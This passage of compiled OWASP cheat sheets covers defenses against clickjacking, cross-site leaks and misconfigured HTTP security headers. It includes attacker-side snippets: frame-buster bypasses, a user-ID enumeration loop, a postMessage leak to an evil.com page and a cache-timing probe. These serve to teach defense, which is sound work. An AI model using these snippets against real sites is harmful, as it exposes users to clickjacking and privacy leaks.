- Implementing JavaScript code in the page to attempt to prevent it being loaded in a frame (known as a "frame-buster").

These mechanisms address frame-based clickjacking. [DoubleClickjacking](#defending-against-doubleclickjacking) uses separate windows and requires additional safeguards for sensitive actions.

Note that these mechanisms are all independent of each other, and where possible more than one of them should be implemented in order to provide defense in depth.

### Defending with Content Security Policy (CSP) frame-ancestors directive

The `frame-ancestors` directive can be used in a Content-Security-Policy HTTP response header to indicate whether or not a browser should be allowed to render a page in a `<frame>` or `<iframe>`. Sites can use this to avoid Clickjacking attacks by ensuring that their content is not embedded into other sites.

`frame-ancestors` allows a site to authorize multiple domains using the normal Content Security Policy semantics.

#### Content-Security-Policy: frame-ancestors Examples

Common uses of CSP frame-ancestors:

- `Content-Security-Policy: frame-ancestors 'none';`
    - This prevents any domain from framing the content. This setting is recommended unless a specific need has been identified for framing.
- `Content-Security-Policy: frame-ancestors 'self';`
    - This only allows the current site to frame the content.
- `Content-Security-Policy: frame-ancestors 'self' https://*.somesite.com https://myfriend.site.com;`
    - For an HTTPS page, this allows its own origin, HTTPS subdomains of `somesite.com`, and `https://myfriend.site.com` to frame it. The two HTTPS host expressions use the default port (443). The [wildcard matches subdomains](https://www.w3.org/TR/CSP3/#match-hosts), not the bare `somesite.com` host; add that host explicitly if required.

Note that the single quotes are required around `self` and `none`, but may not occur around other source expressions.

See the following documentation for further details and more complex examples:

- <https://w3c.github.io/webappsec-csp/#directive-frame-ancestors>
- <https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors>

#### Limitations

**X-Frame-Options takes priority:** [Section "Relation to X-Frame-Options" of the CSP Spec](https://w3c.github.io/webappsec-csp/#frame-ancestors-and-frame-options) says: "*If a resource is delivered with a policy that includes a directive named frame-ancestors and whose disposition is "enforce", then the X-Frame-Options header MUST be ignored*", but older browser versions (e.g., Chrome 40 & Firefox 35) ignored this requirement and followed the X-Frame-Options header instead.

#### Browser Support

The following [browsers](https://caniuse.com/?search=frame-ancestors) support CSP frame-ancestors.

References:

- [Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors#browser_compatibility)

### Defending with X-Frame-Options Response Headers

The `X-Frame-Options` HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a `<frame>` or `<iframe>`. Sites can use this to avoid Clickjacking attacks, by ensuring that their content is not embedded into other sites. Set the X-Frame-Options header for all responses containing HTML content. The possible values are "DENY", "SAMEORIGIN", or "ALLOW-FROM uri"

#### X-Frame-Options Header Types

There are three possible values for the X-Frame-Options header:

- **DENY**, which prevents any domain from framing the content. The "DENY" setting is recommended unless a specific need has been identified for framing.
- **SAMEORIGIN**, which only allows the current site to frame the content.
- **ALLOW-FROM uri**, which permits the specified 'uri' to frame this page. (e.g., `ALLOW-FROM http://www.example.com`).
    - This is an obsolete directive that no longer works in modern browsers.
    - Check limitations below because this will fail open if the browser does not support it.
    - Other browsers support the new [CSP frame-ancestors directive](https://w3c.github.io/webappsec-csp/#directive-frame-ancestors) instead. A few support both.

#### Browser Support

The following [browsers](https://caniuse.com/#search=X-Frame-Options) support X-Frame-Options headers.

References:

- [Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/web/http/headers/x-frame-options#browser_compatibility)
- [IETF Draft](https://datatracker.ietf.org/doc/draft-ietf-websec-x-frame-options/)
- [X-Frame-Options Compatibility Test](https://erlend.oftedal.no/blog/tools/xframeoptions/) - Check this for the LATEST browser support info for the X-Frame-Options header

#### Implementation

To implement this protection, you need to add the `X-Frame-Options` HTTP Response header to any page that you want to protect from being clickjacked via framebusting. One way to do this is to add the HTTP Response Header manually to every page. A possibly simpler way is to implement a filter that automatically adds the header to every page or to add it at Web Application Firewall of Web/Application Server level.

#### Common Defense Mistakes

Meta-tags that attempt to apply the X-Frame-Options directive DO NOT WORK. For example, `<meta http-equiv="X-Frame-Options" content="deny">` will not work. You must apply the X-FRAME-OPTIONS directive as HTTP Response Header as described above. The same rule also applies to the Content Security Policy (CSP) directive `frame-ancestors`, which must be configured as an HTTP Response Header, not in a `<meta>` tag.

#### Limitations

- **Per-page policy specification**: The policy needs to be specified for every page, which can complicate deployment. Providing the ability to enforce it for the entire site, at login time for instance, could simplify adoption.
- **Problems with multi-domain sites**: The current implementation does not allow the website administrator to provide a list of domains that are allowed to frame the page. While listing allowed domains can be dangerous, in some cases a website administrator might have no choice but to use more than one hostname.
- **ALLOW-FROM browser support**: The ALLOW-FROM option is obsolete and no longer works in modern browsers. BE CAREFUL ABOUT DEPENDING ON ALLOW-FROM. If you apply it and the browser does not support it, then you will have NO clickjacking defense in place.
- **Multiple options not supported**: There is no way to allow the current site and a third-party site to frame the same response. Browsers only honor one X-Frame-Options header and only one value on that header.
- **Nested Frames don't work with SAMEORIGIN and ALLOW-FROM**: In the following situation, the `http://framed.invalid/child` frame does not load because ALLOW-FROM applies to the top-level browsing context, not that of the immediate parent. The solution is to use ALLOW-FROM in both the parent and child frames (but this prevents the child frame loading if the `//framed.invalid/parent` page is loaded as the top level document).

![NestedFrames](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/Clickjacking_Defense_Cheat_Sheet_NestedFrames.png)

- **X-Frame-Options Deprecated** While the X-Frame-Options header is supported by the major browsers, it has been obsoleted in favor of the frame-ancestors directive from the CSP Level 2 specification.
- **Proxies** Web proxies are notorious for adding and stripping headers. If a web proxy strips the X-Frame-Options header then the site loses its framing protection.

### Defending with SameSite Cookies

Cookies marked `SameSite=Strict` or `SameSite=Lax` are withheld from [cross-site iframe requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value). This can prevent clickjacking that depends on those cookies for authentication. See the [CSRF guidance on SameSite](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#samesite-cookie-attribute) for its other security uses.

SameSite does not block framing or withhold cookies from same-site requests. An attacker-controlled sibling subdomain with the same scheme can be [same-site while remaining a different origin](https://developer.mozilla.org/en-US/docs/Glossary/Site). Use [CSP `frame-ancestors`](#defending-with-content-security-policy-csp-frame-ancestors-directive) to restrict which origins may frame the page, even when SameSite cookies are configured.

#### Limitations

If the Clickjacking attack does not require the user to be authenticated, this attribute will not provide any protection.

Additionally, while `SameSite` attribute is supported by [most modern browsers](https://caniuse.com/#feat=same-site-cookie-attribute), there are still some users (approximately 6% as of November 2020) with browsers that do not support it.

The use of this attribute should be considered as part of a defense-in-depth approach, and it should not be relied upon as the sole protective measure against Clickjacking.

### Defending against DoubleClickjacking

[DoubleClickjacking](https://evil.blog/2024/12/doubleclickjacking-what.html) tricks a user into activating a sensitive control in another window during a double-click. The target page is a top-level window, so framing restrictions such as `X-Frame-Options` and CSP `frame-ancestors` do not prevent this attack.

[`SameSite` controls whether cookies accompany cross-site requests](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie). `Lax` permits cookies on top-level navigations using safe HTTP methods, while `Strict` withholds them on the initial cross-site request. Neither policy verifies that the user intended the resulting action.

For pages your application controls, such as consent screens, payment confirmations, and account security settings:

- For high-risk actions, require the user to review the action's details and complete [transaction authorization](https://cheatsheetseries.owasp.org/cheatsheets/Transaction_Authorization_Cheat_Sheet.html). Enforce authorization on the server; an extra confirmation button alone is not a complete defense against UI redress.
- Treat disabling sensitive controls until prior interaction as a proposed supplementary mitigation, as described in [Paulos Yibelo's disclosure](https://evil.blog/2024/12/doubleclickjacking-what.html). Mouse movement or a key press alone does not establish that the user understands or approves the action.
- If you use this mitigation, render the controls disabled from the start and test that users can enable and activate them with mouse, keyboard, touch, and assistive technology. [Click events support all these input methods](https://developer.mozilla.org/en-US/docs/Web/API/Element/click_event); do not require every user to move a mouse or press a key.
- Keep the framing defenses above for frame-based attacks. Client-side interaction checks supplement these defenses and do not replace transaction authorization.

### Best-for-now Legacy Browser Frame Breaking Script

One way to defend against clickjacking is to include a "frame-breaker" script in each page that should not be framed. The following methodology will prevent a webpage from being framed even in legacy browsers, that do not support the X-Frame-Options-Header.

In the document HEAD element, add the following:

First apply an ID to the style element itself:

```html
<style id="antiClickjack">
    body{display:none !important;}
</style>
```

Then, delete that style by its ID immediately after in the script:

```html
<script type="text/javascript">
    if (self === top) {
        var antiClickjack = document.getElementById("antiClickjack");
        antiClickjack.parentNode.removeChild(antiClickjack);
    } else {
        top.location = self.location;
    }
</script>
```

This way, everything can be in the document HEAD and you only need one method/taglib in your API.

### window.confirm() Protection

The use of X-Frame-Options or a frame-breaking script is a more fail-safe method of clickjacking protection. However, in scenarios where content must be frameable, then a `window.confirm()` can be used to help mitigate Clickjacking by informing the user of the action they are about to perform.

Treat `window.confirm()` as supplementary confirmation, not a guarantee that users will see a dialog or an origin label. Browsers can [suppress simple dialogs](https://html.spec.whatwg.org/multipage/timers-and-user-prompts.html#cannot-show-simple-dialogs), for example in a sandboxed frame without `allow-modals`; `confirm()` then returns `false`. Only perform the action after a `true` result, as below:

```html
<script type="text/javascript">
    var action_confirm = window.confirm("Are you sure you want to delete your youtube account?")
    if (action_confirm) {
        //... Perform action
    } else {
        //... The user does not want to perform the requested action.`
    }
</script>
```

### Insecure Non-Working Scripts DO NOT USE

Consider the following snippet which is **NOT recommended** for defending against clickjacking:

```html
<script>if (top!=self) top.location.href=self.location.href</script>
```

This simple frame breaking script attempts to prevent the page from being incorporated into a frame or iframe by forcing the parent window to load the current frame's URL. Unfortunately, multiple ways of defeating this type of script have been made public. We outline some here.

#### Double Framing

Some frame busting techniques navigate to the correct page by assigning a value to `parent.location`. This works well if the victim page is framed by a single page. However, if the attacker encloses the victim in one frame inside another (a double frame), then accessing `parent.location` becomes a security violation in all popular browsers, due to the **descendant frame navigation policy**. This security violation disables the counter-action navigation.

**Victim frame busting code:**

```javascript
if(top.location != self.location) {
    parent.location = self.location;
}
```

**Attacker top frame:**

```html
<iframe src="attacker2.html">
```

**Attacker sub-frame:**

```html
<iframe src="http://www.victim.com">
```

#### The onBeforeUnload Event

A user can manually cancel any navigation request submitted by a framed page. To exploit this, the framing page registers an `onBeforeUnload` handler which is called whenever the framing page is about to be unloaded due to navigation. The handler function returns a string that becomes part of a prompt displayed to the user.

Say the attacker wants to frame PayPal. He registers an unload handler function that returns the string "Do you want to exit PayPal?". When this string is displayed to the user is likely to cancel the navigation, defeating PayPal's frame busting attempt.

The attacker mounts this attack by registering an unload event on the top page using the following code:

```html
<script>
    window.onbeforeunload = function(){
        return "Asking the user nicely";
    }
</script>

<iframe src="http://www.paypal.com">
```

PayPal's frame busting code will generate a `BeforeUnload` event activating our function and prompting the user to cancel the navigation event.

#### No-Content Flushing

While the previous attack requires user interaction, the same attack can be done without prompting the user. Modern browsers enable an attacker to automatically cancel the incoming navigation request in an `onBeforeUnload` event handler by repeatedly submitting a navigation request to a site responding with "*204 - No Content*".

Navigating to a No Content site is effectively a NOP, but flushes the request pipeline, thus canceling the original navigation request. Here is sample code to do this:

```javascript
var preventbust = 0
window.onbeforeunload = function() { killbust++ }
setInterval( function() {
    if(killbust > 0){
    killbust = 2;
    window.top.location = 'http://nocontent204.com'
    }
}, 1);
```

```html
<iframe src="http://www.victim.com">
```

#### Restricted zones

Most frame busting relies on JavaScript in the framed page to detect framing and bust itself out. If JavaScript is disabled in the context of the subframe, the frame busting code will not run. There are unfortunately several ways of restricting JavaScript in a subframe:

**In Chrome:**

```html
<iframe src="http://www.victim.com" sandbox></iframe>
```

**Firefox:**

Activate [designMode](https://developer.mozilla.org/en-US/docs/Web/API/Document/designMode) in parent page. While designMode is still supported in modern browsers, its effectiveness as a clickjacking attack vector may vary in current browser versions.

```javascript
document.designMode = "on";
```

## Cross-site leaks

> **Source:** [Cross-site leaks](https://cheatsheetseries.owasp.org/cheatsheets/XS_Leaks_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

This article describes examples of attacks and defenses against cross-site leaks vulnerability (XS Leaks). Since this vulnerability is based on the core mechanism of modern web browsers, it's also called a browser side-channel attack. XS-Leaks attacks seek to exploit the fact of seemingly insignificant information that is exchanged in cross-site communications between sites. This information infers answers to the previously asked questions about the victim's user account. Please take a look at the examples provided below:

- Is the user currently logged in?
- Is the user ID 1337?
- Is the user an administrator?
- Does the user have a person with a particular email address in their contact list?

On the basis of such questions, the attacker might try to deduce the answers, depending on the application's context. In most cases, the answers will be in binary form (yes or no). The impact of this vulnerability depends strongly on the application's risk profile. Despite this, XS Leaks may pose a real threat to user privacy and anonymity.

### Attack vector

![XS Leaks Attack Vector](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/XS_Attack_Vector.png)

- The entire attack takes place on the victim's browser side - just like an XSS attack
- In some cases, the victim must remain on the attacker's site longer for the attack to succeed.

### Same Origin Policy (SOP)

Before describing attacks, it's good to understand one of the most critical security mechanisms in browsers - The Same-origin Policy. A few key aspects:

- Two URLs are considered as **same-origin** if their **protocol**, **port**, and **host** are the same
- Any origin can send a request to another source, but due to the Same-origin Policy, they will not be able to read the response directly
- Same Origin Policy may be relaxed by [Cross Origin Resource Sharing (CORS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS).

| Origin A              | Origin B                  | Same origin?                   |
| -------------         | -------------             | -------------                  |
| `https://example.com` | `http://sub.example.com`  | No, different hosts             |
| `https://example.com` | `https://example.com:443` | Yes! Implicit port in Origin A |

Although the SOP principle protects us from accessing information in cross-origin communication, XS-Leaks attacks based on residual data can infer some information.

### SameSite Cookies

The SameSite attribute of a cookie tells the browser whether it should include the cookie in the request from the other site. The SameSite attribute takes the following values:

- `None` -  the cookie will be attached to a request from another site, but it must be sent over a secure HTTPS channel
- `Lax` - the cookie will be appended to the request from another page if the request method is GET and the request is made to top-level navigation (i.e. the navigation changes the address in the browser top bar)
- `Strict` - the cookie will never be sent from another site

It is worth mentioning here the attitude of Chromium based browsers in which cookies without SameSite attribute set by default are treated as Lax.

SameSite cookies are a strong **defense-in-depth** mechanism against **some** classes of XS Leaks and [CSRF attacks](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html), which can significantly reduce the attack surface, but may not completely cut them (see, e.g., [window-based XS Leak](https://soheilkhodayari.github.io/same-site-wiki/docs/attacks/xs-leaks.html) attacks like [frame counting](https://xsleaks.dev/docs/attacks/frame-counting/) and [navigation](https://xsleaks.dev/docs/attacks/navigations/)).

#### How do we know that two sites are SameSite?

![XS Leaks eTLD explanation](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/XS_Leaks_eTLD.png)

For SameSite cookies, a [site](https://developer.mozilla.org/en-US/docs/Glossary/Site) consists of the scheme and the registrable domain (eTLD+1). The port is not part of the site. For example:

| Full URL                                      | Site (scheme + eTLD+1)             |
| --------------------------------------------  | ------------------------  |
| `https://example.com:443/data?query=test`     | `https://example.com`     |

Why are we talking about eTLD+1 and not just TLD+1? It's because of domains like `.github.io` or `.eu.org`. Such parts are not atomic enough to be compared well. For this reason, a list of "effective" TLDs (eTLDs) was created and can be found [here](https://publicsuffix.org/list/public_suffix_list.dat).

Sites with the same scheme and eTLD+1 are considered same-site. For example:

| Origin A                  | Origin B                   | SameSite?                    |
| ------------------------- | -------------------------- | ---------------------        |
| `https://example.com`     | `http://example.com`       | No, different schemes    |
| `https://evil.net`        | `https://example.com`      | No, different eTLD+1          |
| `https://sub.example.com` | `https://data.example.com` | Yes, subdomains don't matter |

For more information about SameSite, see the excellent article [Understanding "same-site"](https://web.dev/same-site-same-origin/).

### Attacks using the element ID attribute

Elements in the DOM can have an ID attribute that is unique within the document. For example:

```html
<button id="pro">Pro account</button>
```

The browser will automatically focus on an element with a given ID if we append a hash to the URL, e.g. `https://example.com#pro`. What's more, the JavaScript [focus event](https://developer.mozilla.org/en-US/docs/Web/API/Element/focus_event) gets fired. The attacker may try to embed the application in the iframe with specific source on its own controlled page:

![XS-Leaks-ID](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/XS_Leaks_ID.png)

then add listener in main document for [blur event](https://developer.mozilla.org/en-US/docs/Web/API/Element/blur_event) (the opposite of focus). When the victim visits the attackers site, the blur event gets fired. The attacker will be able to conclude that the victim has a pro account.

#### Defense

##### Framing protection

If you don't need other origins to embed your application in a frame, you can consider using one of two mechanisms:

- **Content Security Policy `frame-ancestors`** directive. [Read more about syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/frame-ancestors).
- **X-Frame-Options**  - mainly if you want to support old browsers.

Setting up framing protection efficiently blocks the ability to embed your application in a frame on the attacker-controlled origin and protects from other attacks like [Clickjacking](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html).

##### Fetch metadata (Sec-Fetch-Dest)

Sec-Fetch-Dest header provides us with a piece of information about what is the end goal of the request. This header is included automatically by the browser and is one of the headers within the Fetch Metadata standard.

With Sec-Fetch-Dest you can build effective own resource isolation policies, for example:

```javascript
app.get('/', (req, res) => {
    if (req.get('Sec-Fetch-Dest') === 'iframe') {
        return res.sendStatus(403);
    }
    res.send({
        message: 'Hello!'
    });
});
```

![XS Leaks Sec-Fetch-Dest](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/XS_Leaks_Sec_Fetch_Dest.png)

If you want to use headers from the Fetch Metadata standard, make sure that your users' browsers support this standard (you can check it [here](https://caniuse.com/?search=sec-fetch)). Also, think about using the appropriate fallback in code if the Sec-Fetch-* header is not included in the request.

### Attacks based on error events

Embedding from resources from other origins is generally allowed. For example, you can embed an image from another origin or even script on your page. What is not permitted is reading cross-origin resource due the SOP policy.

When the browser sends a request for a resource, the server processes the request and decides on the response e.g. (200 OK or 404 NOT FOUND). The browser receives the HTTP response and based on that, the appropriate JavaScript event is fired (onload or onerror).

In this way, we can try to load resources and, based on the response status, infer whether they exist or not in the context of the logged-in victim. Let's look at the following situation:

- `GET /api/user/1234` - 200 OK - currently logged-in user is 1234 because we successfully loaded resource ([onload](https://developer.mozilla.org/en-US/docs/Web/API/GlobalEventHandlers/onload) event fired)
- `GET /api/user/1235` - 401 Unauthorized  - 1235 is not the ID of the currently logged in user ([onerror](https://developer.mozilla.org/en-US/docs/Web/API/GlobalEventHandlers/onerror) event will be triggered)

Given the above example, an attacker can use JavaScript on his controlled origin to guess the victim's ID by enumerating over all the values in a simple loop.

```javascript
function checkId(id) {
    const script = document.createElement('script');
    script.src = `https://example.com/api/users/${id}`;
    script.onload = () => {
        console.log(`Logged user id: ${id}`);
    };
    document.body.appendChild(script);
}

// Generate array [0, 1, ..., 40]
const ids = Array(41)
    .fill()
    .map((_, i) => i + 0);

for (const id of ids) {
    checkId(id);
}
```

Note that the attacker here does not care about reading the response body even though it would not be able to due to solid isolation mechanisms in browsers such as [Cross-Origin Resource Blocking](https://www.chromium.org/Home/chromium-security/corb-for-developers). All it needs is the success information it receives when the `onload` event fires.

#### Defense

##### SubResource protection

In some cases, mechanism of special unique tokens may be implemented to protect our sensitive endpoints.

```
/api/users/1234?token=be930b8cfb5011eb9a030242ac130003
```

- Token should be long and unique
- The back-end must correctly validate the token passed in the request

Although it is pretty effective, the solution generates a significant overhead in proper implementation.

##### Fetch metadata (Sec-Fetch-Site)

This header specifies where the request was sent from, and it takes the following values:

- `cross-site`
- `same-origin`
- `same-site`
- `none` - user directly reached the page

Like Sec-Fetch-Dest, this header is automatically appended by the browser to each request and is part of the Fetch Metadata standard. Example usage:

```javascript
app.get('/api/users/:id', authorization, (req, res) => {
    if (req.get('Sec-Fetch-Site') === 'cross-site') {
        return res.sendStatus(403);
    }

    // ... more code

    return res.send({ id: 1234, name: 'John', role: 'admin' });
});
```

##### Cross-Origin-Resource-Policy (CORP)

If the server returns this header with the appropriate value, the browser will not load resources from our site or origin (even static images) in another application. Possible values:

- `same-site`
- `same-origin`
- `cross-origin`

Read more about CORP [here](https://resourcepolicy.fyi/).

### Attacks on postMessage communication

Sometimes in controlled situations we would like, despite SOP, to exchange information between different origins. We can use the postMessage mechanism. See below example:

```javascript
// Origin: http://example.com
const site = new URLSearchParams(window.location.search).get('site'); // https://evil.com
const popup = window.open(site);
popup.postMessage('secret message!', '*');

// Origin: https://evil.com
window.addEventListener('message', e => {
    alert(e.data) // secret message! - leak
});
```

#### Defense

##### Specify strict targetOrigin

To avoid situations like the one above, where an attacker manages to get the reference for a window to receive a message, always specify the exact `targetOrigin` in postMessage. Passing to the `targetOrigin` wildcard `*` causes any origin to receive the message.

```javascript
// Origin: http://example.com
const site = new URLSearchParams(window.location.search).get('site'); // https://evil.com
const popup = window.open(site);
popup.postMessage('secret message!', 'https://sub.example.com');

// Origin: https://evil.com
window.addEventListener('message', e => {
    alert(e.data) // no data!
});
```

### Frame counting attacks

Information about the number of loaded frames in a window can be a source of leakage. Take for example an application that loads search results into a frame, if the results are empty then the frame does not appear.

![XS-Leaks-Frame-Counting](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/XS_Leaks_Frame_Counting.png)

An attacker can get information about the number of loaded frames in a window by counting the number of frames in a `window.frames` object.

So finally, an attacker can obtain the email list and, in a simple loop, open subsequent windows and count the number of frames. If the number of frames in the opened window is equal to 1, the email is in the client's database of the application used by the victim.

#### Defense

##### Cross-Origin-Opener-Policy (COOP)

Setting this header will prevent cross-origin documents from opening in the same browsing context group. This solution ensures that document A opening another document will not have access to the `window` object. Possible values:

- `unsafe-none`
- `same-origin-allow-popups`
- `same-origin`

In case the server returns for example `same-origin` COOP header, the attack fails:

```javascript
const win = window.open('https://example.com/admin/customers?search=john%40example.com');
console.log(win.frames.length) // Cannot read property 'length' of null
```

### Attacks using browser cache

Browser cache helps to significantly reduce the time it takes for a page to load when revisited. However, it can also pose a risk of information leakage. If an attacker is able to detect whether a resource was loaded from the cache after the load time, he will be able to draw some conclusions based on it.

The principle is simple, a resource loaded from cache memory will load incomparably faster than from the server.

![XS Leaks Cache Attack](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/XS_Leaks_Cache_Attack.png)

An attacker can embed a resource on their site that is only accessible to a user with the admin role. Then, using JavaScript, read the load time of a particular resource and, based on this information, deduce whether the resource is in cache or not.

The example selects the first matching [resource timing entry](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByType#return_value) already recorded in the timeline. Set `THRESHOLD` for the measurement context; a short duration alone does not prove a cache hit.

```javascript
    // Illustrative timing threshold for this measurement context
    // const THRESHOLD = ...

    const adminImagePerfEntry = window.performance
        .getEntriesByType('resource')
        .find((entry) => entry.name.endsWith('admin.svg'));

    if (adminImagePerfEntry && adminImagePerfEntry.duration < THRESHOLD) {
        console.log('Possible cache hit (timing heuristic)');
    }
```

#### Defense

##### Unpredictable tokens for images

This technique is accurate when the user wants the resources to still be cached, while an attacker will not be able to find out about it.

```
/avatars/admin.svg?token=be930b8cfb5011eb9a030242ac130003
```

- Tokens should be unique in context of each user
- If an attacker cannot guess this token, it will not be able to detect whether the resource was loaded from cache

##### Using the Cache-Control header

You can disable the cache mechanism if you accept the degraded performance related to the necessity of reloading resources from the server every time a user visits the site. To disable caching for resources you want to protect, set the response header `Cache-Control: no-store`.

### Quick recommendations

- If your application uses cookies, make sure to set the appropriate [SameSite attribute](#samesite-cookies).
- Think about whether you really want to allow your application to be embedded in frames. If not, consider using the mechanisms described in the [framing protection](#framing-protection) section.
- To strengthen the isolation of your application between other origins, use [Cross Origin Resource Policy](#cross-origin-resource-policy-corp) and [Cross Origin Opener Policy](#cross-origin-opener-policy-coop) headers with appropriate values.
- Use the headers available within Fetch Metadata to build your own resource isolation policy.

## HTTP Security Response Headers

> **Source:** [HTTP Security Response Headers](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

HTTP Headers are a great booster for web security with easy implementation. Proper HTTP response headers can help prevent security vulnerabilities like Cross-Site Scripting, Clickjacking, Information disclosure and more.

In this cheat sheet, we will review all security-related HTTP headers, recommended configurations, and reference other sources for complicated headers.

### Security Headers

#### X-Frame-Options

The `X-Frame-Options` HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a `<frame>`, `<iframe>`, `<embed>` or `<object>`. Sites can use this to avoid [clickjacking](https://owasp.org/www-community/attacks/Clickjacking) attacks, by ensuring that their content is not embedded into other sites.

Content Security Policy (CSP) frame-ancestors directive obsoletes X-Frame-Options for supporting browsers ([source](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options)).

X-Frame-Options header is only useful when the HTTP response where it is included has something to interact with (e.g. links, buttons). If the HTTP response is a redirect or an API returning JSON data, X-Frame-Options does not provide any security.

##### Recommendation

Use Content Security Policy (CSP) frame-ancestors directive if possible.

Do not allow displaying of the page in a frame.
> `X-Frame-Options: DENY`

#### X-XSS-Protection

The HTTP `X-XSS-Protection` response header is a feature of Internet Explorer, Chrome, and Safari that stops pages from loading when they detect reflected cross-site scripting (XSS) attacks.

WARNING: Even though this header can protect users of older web browsers that don't yet support CSP, in some cases, this header can create XSS vulnerabilities in otherwise safe websites [source](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection).

##### Recommendation

Use a Content Security Policy (CSP) that disables the use of inline JavaScript.

Do not set this header or explicitly turn it off.
> `X-XSS-Protection: 0`

Please see [Mozilla X-XSS-Protection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection) for details.

#### X-Content-Type-Options

The `X-Content-Type-Options` response HTTP header is used by the server to indicate to the browsers that the MIME types advertised in the Content-Type headers should be followed and not guessed.

This header is used to block browsers' [MIME type sniffing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types#mime_sniffing), which can transform non-executable MIME types into executable MIME types ([MIME Confusion Attacks](https://blog.mozilla.org/security/2016/08/26/mitigating-mime-confusion-attacks-in-firefox/)).

##### Recommendation

Set the Content-Type header correctly throughout the site.

> `X-Content-Type-Options: nosniff`

#### Referrer-Policy

The `Referrer-Policy` HTTP header controls how much referrer information (sent via the Referer header) should be included with requests.

##### Recommendation

Modern browsers default to [`strict-origin-when-cross-origin`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referrer-Policy#strict-origin-when-cross-origin): same-origin requests include the origin, path, and query string in the `Referer` header; cross-origin requests include only the origin, except HTTPS-to-HTTP requests, which omit the header. Set the header explicitly rather than relying on browser defaults.

> `Referrer-Policy: strict-origin-when-cross-origin`

- *NOTE:* For more information on configuring this header please see [Mozilla Referrer-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy).

#### Content-Type

The [`Content-Type`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Type) representation header is used to indicate the original media type of the resource (before any content encoding is applied for sending). If not set correctly, the resource (e.g. an image) may be interpreted as HTML, making XSS vulnerabilities possible.

Although it is recommended to always set the `Content-Type` header correctly, it would constitute a vulnerability only if the content is intended to be rendered by the client and the resource is untrusted (provided or modified by a user).

##### Recommendation

> `Content-Type: text/html; charset=UTF-8`

- *NOTE:* the `charset` attribute is necessary to prevent XSS in **HTML** pages
- *NOTE*: the `Content-Type` can be any of the possible [MIME types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types)

#### Cache-Control

The `Cache-Control` header defines how responses are cached by browsers and intermediate caches.

##### Recommendation

- Use [`no-store`](https://www.rfc-editor.org/rfc/rfc9111.html#section-5.2.2.5) for sensitive responses to prohibit storage in compliant HTTP caches.
- Use `private` to allow caching only in non-shared (user-specific) caches and to prevent storage in shared caches (note that private caches may still persist the response).
- Avoid relying on default caching behavior for sensitive or protected content.
- Be aware that `no-cache` does not prevent caching; it allows caches to store responses. It requires revalidation with the origin server before reuse.

`no-store` does not control every storage mechanism: the [Cache API does not honor HTTP caching headers](https://developer.mozilla.org/en-US/docs/Web/API/Cache). Explicitly exclude sensitive responses from application-managed caches and remove existing sensitive entries; see [Offline Applications](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#offline-applications).

#### Set-Cookie

The [`Set-Cookie`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie) HTTP response header is used to send a cookie from the server to the user agent, so the user agent can send it back to the server later. To send multiple cookies, multiple Set-Cookie headers should be sent in the same response.

This is not a security header per se, but its security attributes are crucial.

##### Recommendation

- Please read [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#cookies) for a detailed explanation on cookie configuration options.

#### Strict-Transport-Security (HSTS)

The HTTP [`Strict-Transport-Security`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security) response header (often abbreviated as HSTS) instructs browsers to only access the website using HTTPS, even if a user attempts to connect over HTTP.

##### Recommendation

> `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload`

- *NOTE*: Read carefully how this header works before using it. If the HSTS header is misconfigured or if there is a problem with the SSL/TLS certificate being used, legitimate users might be unable to access the website. For example, if the HSTS header is set to a very long duration and the SSL/TLS certificate expires or is revoked, legitimate users might be unable to access the website until the HSTS header duration has expired.

See the [HSTS preload requirements](https://hstspreload.org/) before requesting preload inclusion.

Please check out [HTTP Strict Transport Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Strict_Transport_Security_Cheat_Sheet.html) for more information.

#### Expect-CT ❌

